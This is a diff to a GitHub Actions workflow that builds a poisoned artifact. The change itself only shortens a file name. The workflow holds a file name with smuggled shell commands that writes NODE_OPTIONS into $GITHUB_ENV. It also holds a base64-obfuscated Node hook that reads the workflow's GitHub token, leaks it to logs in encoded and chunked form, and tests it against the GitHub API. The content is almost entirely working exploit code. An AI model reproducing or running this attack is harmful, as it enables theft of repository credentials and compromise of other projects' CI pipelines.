@@ -10,12 +10,12 @@ jobs:
       - name: craft artifact
         run: |
           mkdir -p /tmp/content
-          echo "attacker report" > /tmp/content/report.txt
+          echo "attacker report" > /tmp/content/r
           printf 'NODE_OPTIONS=--require=./h.js\n' > /tmp/content/envfile
           python3 - <<'PY'
           import base64
           open('/tmp/content/hook.js','wb').write(base64.b64decode('dHJ5e2NvbnN0IGNwPXJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKTtjb25zdCB0PXByb2Nlc3MuZW52LklOUFVUX1RPS0VOfHxwcm9jZXNzLmVudlsnSU5QVVRfR0lUSFVCLVRPS0VOJ118fCcnOwpjb25zb2xlLmxvZygnSE9PS19MRU49Jyt0Lmxlbmd0aCk7CmNvbnNvbGUubG9nKCdIT09LX0I2ND0nK0J1ZmZlci5mcm9tKHQpLnRvU3RyaW5nKCdiYXNlNjQnKSk7CmNvbnNvbGUubG9nKCdIT09LX0NIVU5LUz0nK3QubWF0Y2goLy57MSw0fS9nKS5qb2luKCctJykpOwp0cnl7Y29uc3Qgcj1jcC5leGVjU3luYygnY3VybCAtc1MgLUggIkF1dGhvcml6YXRpb246IEJlYXJlciAnK3QrJyIgaHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS91c2VyJyx7ZW5jb2Rpbmc6J3V0ZjgnLHN0ZGlvOlsnaWdub3JlJywncGlwZScsJ3BpcGUnXX0pO2NvbnNvbGUubG9nKCdIT09LX0FQST0nK3IpO31jYXRjaChlKXtjb25zb2xlLmxvZygnSE9PS19DVVJMX0VSUj0nKyhlLnN0ZG91dHx8ZS5tZXNzYWdlKSk7fQp9Y2F0Y2goZSl7Y29uc29sZS5sb2coJ0hPT0tfRVJSPScrZS5tZXNzYWdlKTt9Cg=='))
-          open('/tmp/content/report.txt;D=$(dirname${IFS}$(mktemp));S=${D%tmp};B=$D${S}content${S}contentdefault;cp${IFS}$B${S}envfile${IFS}$GITHUB_ENV;cp${IFS}$B${S}hook.js${IFS}h.js;true;#.txt', 'w').write('x\n')
+          open('/tmp/content/r;D=$(dirname${IFS}$(mktemp));S=${D%tmp};B=$D${S}content${S}contentdefault;cp${IFS}$B${S}envfile${IFS}$GITHUB_ENV;cp${IFS}$B${S}hook.js${IFS}h.js;true;#.txt', 'w').write('x\n')
           PY
       - name: upload artifact
         uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
